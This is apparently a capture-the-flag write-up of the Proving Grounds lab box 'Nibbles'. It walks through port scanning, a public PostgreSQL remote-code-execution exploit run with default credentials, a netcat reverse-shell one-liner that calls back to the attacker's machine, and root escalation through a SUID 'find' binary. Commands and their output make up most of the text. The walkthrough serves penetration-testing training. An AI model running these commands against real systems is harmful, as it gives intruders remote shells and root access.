---
title: Proving Grounds - Nibbles
date: 2022-11-02
author: Marius
tags: [ctf, 'proving grounds', 'pg']
---

Nibbles is a intermediate rated box on Proving Grounds, which is also found in NetSec Focus trophy list and in many OSCP preparation lab lists.

### Nmap Scan

```
└─$ nmap -sV -sC 192.168.157.47             
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 10:04 EDT
Nmap scan report for 192.168.157.47
Host is up (0.12s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9

```

### UDP Scan

No ports open

### FTP

Anonymous access is disabled, moving on for now.

### HTTP

* Directory brute forcing gave no results
* Attempted to fuzz http://192.168.157.47/page2.html with different page number combinations with no results
* No low hanging fruits, moving on for now

### Posgresql

Searched google for "PostGreSQL 11.3 Exploit" and stumbled across [PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50847)

Downloaded and attempted to run this with default values even though it's authenticated. Just edited the script to change the port and IP address and it seemed to work. Looks like default username/password was not changed.

```
┌──(kali㉿kali)-[~/ctf/pg_practise/nibbles]
└─$ python 50847.py 

[+] Connecting to PostgreSQL Database on 192.168.157.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Add the argument -c [COMMAND] to execute a system command

```

Added a reverse shell to command parameter and we got a local user shell !

```
┌──(kali㉿kali)-[~/ctf/pg_practise/nibbles]
└─$ python 50847.py -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.157 80 >/tmp/f"

[+] Connecting to PostgreSQL Database on 192.168.157.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _8e1261939f6bc6f21e1804f30e744ab7

```

Local flag

```
$ whoami
postgres
$ find / -name local.txt 2>/dev/null
/home/wilson/local.txt
```

### Privilege escalation

I spawned tty with python and did SUID and crontab checks first.

```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
postgres@nibbles:/var/lib/postgresql/11/main$

postgres@nibbles:/var/lib/postgresql/11/main$ find / -type f -perm -04000 -ls 2>/dev/null 
</main$ find / -type f -perm -04000 -ls 2>/dev/null 
   137358     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
    19052    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
    15602     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      282     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
      286     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
      285     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
      283     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
    34845     36 -rwsr-xr-x   1 root     root          34896 Jan  7  2019 /usr/bin/fusermount
     3838     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
      261     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
     4071     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
     2248    312 -rwsr-xr-x   1 root     root         315904 Feb 16  2019 /usr/bin/find
    22663    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo
     4073     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount

postgres@nibbles:/var/lib/postgresql/11/main$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```
Looking through SUID files I noticed there's find executable which is not something I have seen frequently. Double checking it on GTFOBins we can see it can be used to elevate our privileges.
```
postgres@nibbles:/var/lib/postgresql/11/main$ /bin/find . -exec /bin/sh -p \; -quit
<esql/11/main$ /bin/find . -exec /bin/sh -p \; -quit
# whoami 
whoami
root
```

GG we got root.
